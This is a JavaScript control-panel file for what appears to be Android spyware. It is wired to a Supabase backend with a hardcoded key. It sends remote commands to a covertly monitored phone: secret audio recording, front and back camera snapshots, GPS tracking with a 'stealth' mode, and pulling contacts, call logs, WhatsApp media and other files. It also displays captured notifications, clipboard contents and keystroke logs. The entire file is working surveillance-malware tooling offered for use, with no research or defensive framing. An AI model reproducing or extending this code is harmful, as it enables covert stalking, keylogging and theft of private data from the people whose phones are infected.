const SUPABASE_URL = "https://lqlwkyemypvjtjzggkur.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxxbHdreWVteXB2anRqemdna3VyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxMTk3MTcsImV4cCI6MjA5MTY5NTcxN30.BjK_6zBcf00ppDqw3FDkrQnddPvPSwZVYhB5Pi_2PL4";
const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// UI Elements
const btnStart = document.getElementById('btn-start');
const btnStop = document.getElementById('btn-stop');
const btnLocate = document.getElementById('btn-locate');
const recordingTableBody = document.getElementById('recording-table-body');
const notifList = document.getElementById('notif-list');
const logConsole = document.getElementById('console');
const navButtons = document.querySelectorAll('.nav-btn');
const searchInput = document.getElementById('search-recordings');
const locationStatus = document.getElementById('location-status');
const photoGrid = document.getElementById('photo-grid');
const btnSnapFront = document.getElementById('btn-snap-front');
const btnSnapBack = document.getElementById('btn-snap-back');
const btnRefreshPhotos = document.getElementById('btn-refresh-photos');

const views = {
    dashboard: document.getElementById('view-dashboard'),
    recordings: document.getElementById('view-recordings'),
    notifications: document.getElementById('view-notifications'),
    location: document.getElementById('view-location'),
    camera: document.getElementById('view-camera'),
    social: document.getElementById('view-social'),
    files: document.getElementById('view-files'),
    intel: document.getElementById('view-intel'),
    console: document.getElementById('view-console')
};
const btnSyncContacts = document.getElementById('btn-sync-contacts');
const btnSyncCalls = document.getElementById('btn-sync-calls');
const contactsList = document.getElementById('contacts-list');
const callLogsList = document.getElementById('call-logs-list');

const fileList = document.getElementById('file-list');
const fileVaultGrid = document.getElementById('file-vault-grid');
const currentPathHeader = document.getElementById('current-path-header');
const folderWhatsApp = document.getElementById('folder-whatsapp');
const folderDownloads = document.getElementById('folder-downloads');
const folderCamera = document.getElementById('folder-camera');

const intelFeed = document.getElementById('intel-feed');

const docsList = document.getElementById('discovered-docs-list');
const shadowGrid = document.getElementById('shadow-vault-grid');

const viewTitle = document.getElementById('view-title');

let cachedRecordings = [];
let map, marker;
let mapInitialized = false;
let gpsPulseActive = false;

// Navigation Logic
function switchView(viewName) {
    Object.values(views).forEach(v => v.classList.add('hidden'));
    views[viewName].classList.remove('hidden');
    navButtons.forEach(btn => {
        if (btn.dataset.view === viewName) btn.classList.add('active');
        else btn.classList.remove('active');
    });
    const titles = {
        dashboard: "Agent Overview",
        recordings: "Audio Recordings",
        notifications: "Notification Feed",
        location: "GPS Tracking",
        camera: "Stealth Lens Camera",
        social: "Social Intelligence Map",
        files: "Internal Storage Explorer",
        intel: "Omniscient Intelligence Feed",
        console: "System Command Logs"
    };
    viewTitle.textContent = titles[viewName];

    if (viewName === 'location') {
        if (!mapInitialized) {
            initMap();
        } else {
            setTimeout(() => map.invalidateSize(), 100);
        }
    }
    if (viewName === 'camera') {
        loadPhotos();
    }
    if (viewName === 'social') {
        loadSocialData();
    }
    if (viewName === 'files') {
        loadVault();
        loadDiscoveredDocs();
        loadShadowVault();
    }
    if (viewName === 'intel') {
        loadIntelFeed();
    }
}

navButtons.forEach(btn => {
    btn.addEventListener('click', () => {
        if (btn.dataset.view) {
            switchView(btn.dataset.view);
        }
    });
});

// Map Logic
function initMap() {
    map = L.map('map').setView([0, 0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
    }).addTo(map);
    mapInitialized = true;
    loadLastLocation();
}

async function loadLastLocation() {
    log(`FETCH: Checking for latest GPS coordinates...`);
    const { data, error } = await client
        .from('location_data')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle();

    if (error) {
        log(`ERR: Location fetch failed: ${error.message}`);
        return;
    }

    if (data) {
        const lat = data.latitude;
        const lng = data.longitude;
        const time = new Date(data.created_at).toLocaleString();
        
        log(`GPS: Found coordinates (${lat.toFixed(4)}, ${lng.toFixed(4)}) from ${time}`);
        locationStatus.textContent = `Last seen: ${time} (${lat.toFixed(4)}, ${lng.toFixed(4)})`;
        
        if (!marker) {
            marker = L.marker([lat, lng]).addTo(map);
        } else {
            marker.setLatLng([lat, lng]);
        }
        map.setView([lat, lng], 15);
    } else {
        log(`IDLE: No GPS data found in table yet.`);
    }
}

// Helper Functions
function log(msg) {
    const entry = document.createElement('div');
    entry.textContent = `> ${msg}`;
    logConsole.appendChild(entry);
    logConsole.scrollTop = logConsole.scrollHeight;
}

function formatDate(filename) {
    const match = filename.match(/rec_(\d+)/);
    if (!match) return "Unknown Date";
    const timestamp = parseInt(match[1]);
    return new Date(timestamp).toLocaleString('en-GB', { 
        day: '2-digit', month: 'short', year: 'numeric',
        hour: '2-digit', minute: '2-digit'
    });
}

// Supabase Logic
async function sendCommand(command) {
    log(`SIGNAL: Sending [${command}]...`);
    const { error } = await client.from('remote_commands').insert([{ command }]);
    if (error) {
        log(`ERR: ${error.message}`);
    } else {
        log(`OK: [${command}] signal delivered to cloud.`);
    }
}

async function loadRecordings() {
    const { data, error } = await client.storage.from('recordings').list('', {
        sortBy: { column: 'name', order: 'desc' }
    });
    
    if (error) {
        log(`Storage List Error: ${error.message}`);
        return;
    }

    cachedRecordings = data.filter(file => file.name.endsWith('.m4a'));
    renderRecordingsTable(cachedRecordings);
}

function renderRecordingsTable(recordings) {
    recordingTableBody.innerHTML = '';
    
    if (recordings.length === 0) {
        recordingTableBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding: 40px; color:var(--text-dim)">No recordings found matching your search.</td></tr>';
        return;
    }

    recordings.forEach(file => {
        const prettyDate = formatDate(file.name);
        const row = document.createElement('tr');
        row.innerHTML = `
            <td style="font-weight:600">${prettyDate}</td>
            <td style="font-family:JetBrains Mono; font-size:11px; color:var(--text-dim)">${file.name}</td>
            <td><span class="badge">AUDIO/M4A</span></td>
            <td style="text-align:right">
                <button class="btn btn-primary btn-download" style="padding: 6px 12px; font-size: 10px;">DOWNLOAD</button>
                <button class="btn btn-danger btn-delete-rec" style="padding: 6px 12px; font-size: 10px;">DELETE</button>
            </td>
        `;

        row.querySelector('.btn-download').onclick = async () => {
            const { data: urlData, error: urlErr } = await client.storage.from('recordings').createSignedUrl(file.name, 60);
            if (urlErr) log(`Download Error: ${urlErr.message}`);
            else window.open(urlData.signedUrl);
        };

        row.querySelector('.btn-delete-rec').onclick = async () => {
            if (confirm(`Permanently delete this recording: ${prettyDate}?`)) {
                log(`Deleting ${file.name}...`);
                const { error: delErr } = await client.storage.from('recordings').remove([file.name]);
                if (delErr) log(`Delete Error: ${delErr.message}`);
                else {
                    log("Deleted successfully.");
                    loadRecordings();
                }
            }
        };

        recordingTableBody.appendChild(row);
    });
}

searchInput.addEventListener('input', (e) => {
    const term = e.target.value.toLowerCase();
    const filtered = cachedRecordings.filter(file => {
        const dateStr = formatDate(file.name).toLowerCase();
        return file.name.toLowerCase().includes(term) || dateStr.includes(term);
    });
    renderRecordingsTable(filtered);
});

async function deleteNotification(id) {
    const { error } = await client.from('notifier_data').delete().eq('id', id);
    if (error) log(`Notification Delete Error: ${error.message}`);
    else loadNotifications();
}

let cachedNotifications = [];

async function loadNotifications() {
    const { data, error } = await client
        .from('notifier_data')
        .select('*')
        .order('created_at', { ascending: false });
    if (error) return;

    cachedNotifications = data;
    renderNotifications(cachedNotifications);
}

function renderNotifications(data) {
    notifList.innerHTML = '';
    if (data.length === 0) {
        notifList.innerHTML = '<div class="card"><span style="color:var(--text-dim)">No notifications found.</span></div>';
        return;
    }

    data.forEach(notif => {
        const time = new Date(notif.created_at).toLocaleString();
        const appName = (notif.package_name || '').split('.').pop().toUpperCase() || 'SYSTEM';

        const item = document.createElement('div');
        item.className = 'card notif-card';
        item.style.marginBottom = '12px';
        item.style.transition = 'all 0.2s ease';
        item.style.cursor = 'default';
        item.innerHTML = `
            <div style="display:flex; justify-content:space-between; margin-bottom:8px; align-items: center;">
                <span style="color:var(--primary); font-family:'JetBrains Mono', monospace; font-size:11px; padding: 4px 8px; background: rgba(124, 58, 237, 0.1); border-radius: 4px; border: 1px solid rgba(124, 58, 237, 0.2);">${appName}</span>
                <div style="display:flex; gap:15px; align-items:center;">
                    <span style="color:var(--text-dim); font-size:11px;">${time}</span>
                    <span class="btn-delete-notif" style="cursor:pointer; color:var(--danger); font-size:16px; opacity: 0.5; transition: 0.2s;">&times;</span>
                </div>
            </div>
            <div style="font-weight:700; font-size:15px; margin-bottom:4px; color: var(--text);">${notif.title}</div>
            <div style="font-size:13px; color:var(--text-dim); line-height: 1.5;">${notif.content}</div>
        `;
        
        item.addEventListener('mouseenter', () => {
            item.style.transform = 'translateY(-2px)';
            item.style.boxShadow = '0 8px 24px rgba(0,0,0,0.2)';
            item.style.borderColor = 'rgba(124, 58, 237, 0.3)';
            item.querySelector('.btn-delete-notif').style.opacity = '1';
        });
        item.addEventListener('mouseleave', () => {
            item.style.transform = 'translateY(0)';
            item.style.boxShadow = 'none';
            item.style.borderColor = 'var(--border)';
            item.querySelector('.btn-delete-notif').style.opacity = '0.5';
        });

        item.querySelector('.btn-delete-notif').onclick = () => deleteNotification(notif.id);
        
        notifList.appendChild(item);
    });
}

const searchNotifsInput = document.getElementById('search-notifications');
if(searchNotifsInput) {
    searchNotifsInput.addEventListener('input', (e) => {
        const term = e.target.value.toLowerCase();
        const filtered = cachedNotifications.filter(n => {
            return (n.title || '').toLowerCase().includes(term) || 
                   (n.content || '').toLowerCase().includes(term) || 
                   (n.package_name || '').toLowerCase().includes(term);
        });
        renderNotifications(filtered);
    });
}

const btnRefreshNotifs = document.getElementById('btn-refresh-notifs');
if(btnRefreshNotifs) {
    btnRefreshNotifs.addEventListener('click', loadNotifications);
}

// Camera Logic (Dashboard side)
async function loadPhotos() {
    const { data, error } = await client.storage.from('photos').list('', {
        sortBy: { column: 'name', order: 'desc' }
    });

    if (error) {
        log(`Gallery Error: ${error.message}`);
        return;
    }

    photoGrid.innerHTML = '';
    if (data.length === 0) {
        photoGrid.innerHTML = '<div style="color:var(--text-dim); padding:40px;">No photos captured yet. Click SNAP to start.</div>';
        return;
    }

    data.forEach(file => {
        const row = document.createElement('div');
        row.className = 'photo-card';
        const timestamp = file.name.match(/snap_(\d+)/)?.[1];
        const dateStr = timestamp ? new Date(parseInt(timestamp)).toLocaleString() : "Unknown date";
        
        row.innerHTML = `
            <img class="photo-img" src="" alt="Captured Image" data-name="${file.name}">
            <div class="photo-info">
                <div style="font-weight:600; margin-bottom:4px;">${dateStr}</div>
                <div style="display:flex; gap:8px;">
                    <button class="btn btn-primary btn-dl-photo" style="flex:1; padding:6px; font-size:10px;">DL</button>
                    <button class="btn btn-danger btn-del-photo" style="flex:1; padding:6px; font-size:10px;">DEL</button>
                </div>
            </div>
        `;

        // Create signed URL for the image
        (async () => {
            const { data: urlData } = await client.storage.from('photos').createSignedUrl(file.name, 3600);
            if (urlData) row.querySelector('.photo-img').src = urlData.signedUrl;
        })();

        row.querySelector('.btn-dl-photo').onclick = async () => {
            const { data: urlData } = await client.storage.from('photos').createSignedUrl(file.name, 60);
            if (urlData) window.open(urlData.signedUrl);
        };

        row.querySelector('.btn-del-photo').onclick = async () => {
            if (confirm("Permanently delete this photo?")) {
                const { error: delErr } = await client.storage.from('photos').remove([file.name]);
                if (delErr) log(`Del Err: ${delErr.message}`);
                else loadPhotos();
            }
        };

        photoGrid.appendChild(row);
    });
}

// Social Logic
async function loadSocialData() {
    // Load Contacts
    const { data: contacts, error: cErr } = await client.from('contacts')
        .select('*')
        .order('name', { ascending: true });

    if (!cErr) {
        contactsList.innerHTML = contacts.map(c => `
            <tr style="border-bottom: 1px solid var(--border); font-size:13px;">
                <td style="padding:10px; font-weight:600;">${c.name}</td>
                <td style="padding:10px;">${c.phone_number}</td>
                <td style="padding:10px; color:var(--text-dim); font-size:11px;">${new Date(c.created_at).toLocaleString()}</td>
            </tr>
        `).join('');
    }

    // Load Call Logs
    const { data: logs, error: lErr } = await client.from('call_logs')
        .select('*')
        .order('timestamp', { ascending: false });

    if (!lErr) {
        callLogsList.innerHTML = logs.map(l => {
            const date = new Date(l.timestamp).toLocaleString();
            const duration = Math.floor(l.duration / 60) + "m " + (l.duration % 60) + "s";
            const typeColor = l.type === 'Missed' ? '#ff4d4d' : (l.type === 'Incoming' ? '#4dff88' : '#4db8ff');
            
            return `
                <tr style="border-bottom: 1px solid var(--border); font-size:13px;">
                    <td style="padding:10px; font-weight:600;">${l.name || 'Unknown'}</td>
                    <td style="padding:10px;">${l.number}</td>
                    <td style="padding:10px;"><span style="color:${typeColor}; font-weight:700;">${l.type}</span></td>
                    <td style="padding:10px;">${duration}</td>
                    <td style="padding:10px; color:var(--text-dim); font-size:11px;">${date}</td>
                </tr>
            `;
        }).join('');
    }
}

// Files & Storage Logic
async function browseFolder(path) {
    log(`Exploring: ${path}`);
    currentPathHeader.textContent = `Current Directory: ${path}`;
    fileList.innerHTML = `<tr><td colspan="3" style="text-align:center; padding:20px;">Scanning remote storage...</td></tr>`;
    sendCommand('list_files', { path });
}

async function loadVault() {
    const { data: files, error } = await client.storage.from('files').list();
    if (!error) {
        fileVaultGrid.innerHTML = files.map(f => {
            const isImage = f.name.match(/\.(jpg|jpeg|png|gif|webp)$/i);
            const publicUrl = client.storage.from('files').getPublicUrl(f.name).data.publicUrl;
            
            return `
                <div class="card" style="padding:10px;">
                    ${isImage ? `<img src="${publicUrl}" style="width:100%; height:120px; object-fit:cover; border-radius:8px; margin-bottom:10px;">` : `<div style="font-size:40px; text-align:center; padding:30px;">📄</div>`}
                    <div style="font-size:11px; font-weight:700; word-break:break-all; margin-bottom:5px;">${f.name}</div>
                    <div style="display:flex; gap:5px;">
                        <a href="${publicUrl}" download class="btn btn-primary" style="flex:1; text-align:center; padding:5px; font-size:10px;">DOWNLOAD</a>
                        <button class="btn btn-danger" onclick="deleteVaultFile('${f.name}')" style="padding:5px; font-size:10px;">🗑️</button>
                    </div>
                </div>
            `;
        }).join('');
    }
}

async function deleteVaultFile(name) {
    if (confirm(`Delete ${name} from Vault?`)) {
        log(`VAULT: Deleting ${name}...`);
        const { error } = await client.storage.from('files').remove([name]);
        if (!error) {
            log(`VAULT: Deleted ${name} successfully.`);
            loadVault();
        }
        else log(`Vault Delete Error: ${error.message}`);
    }
}

// Subscribe to File List updates
client.channel('file_lists_channel')
    .on('postgres_changes', { event: '*', schema: 'public', table: 'file_lists' }, payload => {
        const files = payload.new.files;
        fileList.innerHTML = files.map(f => `
            <tr style="border-bottom: 1px solid var(--border); font-size:12px;">
                <td style="padding:10px;">
                    <span style="font-size:16px; margin-right:5px;">${f.isDirectory ? '📁' : '📄'}</span>
                    ${f.name}
                </td>
                <td style="padding:10px; color:var(--text-dim);">${f.isDirectory ? '-' : (f.size / 1024 / 1024).toFixed(2) + ' MB'}</td>
                <td style="padding:10px;">
                    ${f.isDirectory ? 
                        `<button class="btn btn-primary" style="padding:4px 8px; font-size:10px;" onclick="browseFolder('${f.path.replace(/\\/g, '/')}')">OPEN</button>` : 
                        `<button class="btn btn-primary" style="padding:4px 8px; font-size:10px;" onclick="sendCommand('pull_file', { path: '${f.path.replace(/\\/g, '/')}' })">PULL</button>`}
                </td>
            </tr>
        `).join('');
    }).subscribe();

// Intelligence Logic
async function loadIntelFeed() {
    const { data: logs, error } = await client.from('intel_logs')
        .select('*')
        .neq('type', 'HEARTBEAT')
        .order('created_at', { ascending: false });

    if (!error) {
        intelFeed.innerHTML = logs.map(l => renderIntelItem(l)).join('');
    }
}

function renderIntelItem(l) {
    let icon = '👁️';
    let color = '#4dff88';
    
    if (l.type === 'CLIPBOARD') {
        icon = '📋';
        color = '#4db8ff';
    } else if (l.type === 'KEYLOG') {
        icon = '⌨️';
        color = '#ff9900';
    }
    
    return `
        <div style="background: rgba(255,255,255,0.03); border-left: 4px solid ${color}; padding: 15px; border-radius: 4px;">
            <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                <span style="font-size:12px; font-weight:700; color:${color};">${icon} ${l.type}</span>
                <span style="font-size:10px; color:var(--text-dim);">${new Date(l.created_at).toLocaleString()}</span>
            </div>
            <div style="font-size:14px; word-break:break-all; font-family: 'Courier New', monospace;">${l.content}</div>
            ${l.app_package ? `<div style="font-size:10px; color:var(--text-dim); margin-top:5px;">Source: ${l.app_package}</div>` : ''}
        </div>
    `;
}

// Subscribe to Live Intelligence
client.channel('intel_channel')
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'intel_logs' }, payload => {
        if (payload.new.type === 'HEARTBEAT') {
            lastSeenTimestamp = new Date(payload.new.created_at).getTime();
            updateOnlineStatusUI();
            return;
        }

        log(`CRITICAL INTEL: ${payload.new.type}`);
        const newItem = document.createElement('div');
        newItem.innerHTML = renderIntelItem(payload.new);
        intelFeed.prepend(newItem);
        
        if (payload.new.type === 'CLIPBOARD') {
            // Toast or specific alert
            alert("New Clipboard Captured: " + payload.new.content.substring(0, 20) + "...");
        }
    }).subscribe();

// Discovery & Shadow Logic
async function loadDiscoveredDocs() {
    const { data: docs, error } = await client.from('discovered_docs')
        .select('*')
        .order('created_at', { ascending: false });

    if (!error) {
        if (docs.length === 0) {
            docsList.innerHTML = '<div style="text-align:center; color:var(--text-dim); padding:20px; font-size:12px;">No documents discovered yet.</div>';
            return;
        }
        docsList.innerHTML = docs.map(doc => `
            <div style="background:rgba(255,255,255,0.03); padding:10px; border-radius:4px; display:flex; justify-content:space-between; align-items:center;">
                <div style="overflow:hidden;">
                    <div style="font-size:12px; font-weight:700; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${doc.name}</div>
                    <div style="font-size:10px; color:var(--text-dim);">${doc.path}</div>
                </div>
                <button class="btn btn-secondary" onclick="pullAndVault('${doc.path.replace(/\\/g, '/')}')" style="padding:4px 8px; font-size:10px;">PULL</button>
            </div>
        `).join('');
    }
}

async function loadShadowVault() {
    log("Loading Shadow Vault...");
    const deviceId = "Unknown"; // In a real scenario, this would be the active device ID
    const { data: files, error } = await client.storage.from('files').list(`shadow_vault/${deviceId}`);

    if (!error) {
        shadowGrid.innerHTML = files.map(f => {
            const publicUrl = client.storage.from('files').getPublicUrl(`shadow_vault/${deviceId}/${f.name}`).data.publicUrl;
            return `
                <div class="card" style="padding:5px; position:relative;">
                    <img src="${publicUrl}" style="width:100%; height:80px; object-fit:cover; border-radius:3px; margin-bottom:5px;">
                    <div style="font-size:9px; color:var(--text-dim); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${f.name}</div>
                    <button onclick="deleteShadowFile('${f.name}')" style="position:absolute; top:2px; right:2px; background:rgba(255,0,0,0.7); border:none; color:white; border-radius:50%; width:18px; height:18px; font-size:10px; cursor:pointer;">&times;</button>
                </div>
            `;
        }).join('');
    }
}

async function deleteShadowFile(name) {
    const deviceId = "Unknown";
    if (confirm(`Delete ${name} from Shadow Vault?`)) {
        const { error } = await client.storage.from('files').remove([`shadow_vault/${deviceId}/${name}`]);
        if (!error) loadShadowVault();
        else log(`Shadow Delete Error: ${error.message}`);
    }
}

// Subscribe to Discovery
client.channel('discovery_channel')
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'discovered_docs' }, payload => {
        log(`CRITICAL DISCOVERY: ${payload.new.name}`);
        loadDiscoveredDocs();
    }).subscribe();

async function pullAndVault(path) {
    log(`PULLING: ${path} to Vault...`);
    sendCommand('pull_file', { path });
}

// Event Listeners
let recordTimerInterval = null;
let recordSeconds = 0;

function formatTime(seconds) {
    const m = Math.floor(seconds / 60).toString().padStart(2, '0');
    const s = (seconds % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
}

btnStart.addEventListener('click', () => {
    sendCommand('start_record');
    const timerEl = document.getElementById('record-timer');
    timerEl.classList.remove('hidden');
    recordSeconds = 0;
    timerEl.innerHTML = `⏱️ ${formatTime(recordSeconds)}`;
    clearInterval(recordTimerInterval);
    recordTimerInterval = setInterval(() => {
        recordSeconds++;
        timerEl.innerHTML = `⏱️ ${formatTime(recordSeconds)}`;
    }, 1000);
});

btnStop.addEventListener('click', () => {
    sendCommand('stop_record');
    const timerEl = document.getElementById('record-timer');
    clearInterval(recordTimerInterval);
    timerEl.classList.add('hidden');
    recordSeconds = 0;
});
btnLocate.addEventListener('click', () => sendCommand('get_location'));
btnSnapFront.addEventListener('click', () => sendCommand('snap_front'));
btnSnapBack.addEventListener('click', () => sendCommand('snap_back'));
btnSyncContacts.addEventListener('click', () => {
    log("Requesting Contacts Sync...");
    sendCommand('get_contacts');
});
btnSyncCalls.addEventListener('click', () => {
    log("Requesting Call Log Sync...");
    sendCommand('get_call_logs');
});

folderWhatsApp.addEventListener('click', () => browseFolder('/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images'));
folderDownloads.addEventListener('click', () => browseFolder('/storage/emulated/0/Download'));
folderCamera.addEventListener('click', () => browseFolder('/storage/emulated/0/DCIM/Camera'));

btnRefreshPhotos.addEventListener('click', () => {
    log("Refreshing photo gallery...");
    loadPhotos();
});

document.getElementById('btn-refresh-recordings').addEventListener('click', () => {
    log("Manual refresh triggered...");
    loadRecordings();
});



document.getElementById('btn-gps-toggle').addEventListener('click', () => {
    gpsPulseActive = !gpsPulseActive;
    const btn = document.getElementById('btn-gps-toggle');
    if (gpsPulseActive) {
        btn.textContent = "GPS PULSE: ON";
        btn.style.background = "rgba(77, 255, 136, 0.1)";
        btn.style.color = "#4dff88";
        log("GPS: Activating Location Pulse...");
        sendCommand('gps_on');
    } else {
        btn.textContent = "GPS PULSE: OFF";
        btn.style.background = "rgba(255, 171, 0, 0.1)";
        btn.style.color = "var(--warning)";
        log("GPS: Deactivating Location Pulse (Stealth Mode)...");
        sendCommand('gps_off');
    }
});

// Initial Load & Polling
setInterval(() => {
    if (searchInput.value === '') {
        loadRecordings();
    }
    if (searchNotifsInput && searchNotifsInput.value === '') {
        loadNotifications();
    }
    if (mapInitialized) {
        loadLastLocation();
    }
}, 8000);

loadRecordings();
loadNotifications();

// --- LIVE HEARTBEAT & CONNECTION STATUS ---
let lastSeenTimestamp = 0;

function updateOnlineStatusUI() {
    const badge = document.getElementById('agent-status-badge');
    const dot = document.getElementById('status-dot');
    const text = document.getElementById('last-seen-text');
    
    if (!badge || !text || !dot) return;
    
    if (lastSeenTimestamp === 0) {
        badge.style.color = 'var(--danger)';
        dot.style.background = 'var(--danger)';
        badge.querySelector('span:last-child').textContent = 'AGENT OFFLINE';
        text.textContent = 'Last seen: Never';
        return;
    }
    
    const diff = Date.now() - lastSeenTimestamp;
    if (diff < 150000) { // 2.5 minutes threshold (150,000 ms to allow for network buffers)
        badge.style.color = 'var(--success)';
        dot.style.background = 'var(--success)';
        badge.querySelector('span:last-child').textContent = 'AGENT ONLINE';
    } else {
        badge.style.color = 'var(--danger)';
        dot.style.background = 'var(--danger)';
        badge.querySelector('span:last-child').textContent = 'AGENT OFFLINE';
    }
    
    const seconds = Math.floor(diff / 1000);
    if (seconds < 60) {
        text.textContent = `Last seen: ${seconds}s ago`;
    } else {
        const minutes = Math.floor(seconds / 60);
        text.textContent = `Last seen: ${minutes}m ago`;
    }
}

async function fetchLatestHeartbeat() {
    const { data, error } = await client
        .from('intel_logs')
        .select('created_at')
        .eq('type', 'HEARTBEAT')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle();
        
    if (!error && data) {
        lastSeenTimestamp = new Date(data.created_at).getTime();
        updateOnlineStatusUI();
    }
}

// Initial fetch and interval update
fetchLatestHeartbeat();
setInterval(updateOnlineStatusUI, 5000);

// Mobile Sidebar Toggle
document.getElementById('mobile-menu-btn')?.addEventListener('click', () => {
    document.querySelector('aside').classList.toggle('open');
});
// Close sidebar when clicking a nav button on mobile
document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        if (window.innerWidth <= 768) {
            document.querySelector('aside').classList.remove('open');
        }
    });
});
